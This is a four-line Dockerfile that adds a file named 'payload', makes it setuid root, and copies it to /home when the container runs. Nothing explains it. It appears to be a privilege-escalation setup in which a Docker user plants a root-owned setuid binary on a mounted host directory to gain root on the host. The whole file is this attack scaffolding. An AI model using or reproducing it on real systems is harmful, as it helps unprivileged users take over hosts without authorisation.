FROM alpine:latest
ADD payload /root/payload
RUN chown root:root /root/payload && chmod 4755 /root/payload
CMD cp /root/payload /home/payload 
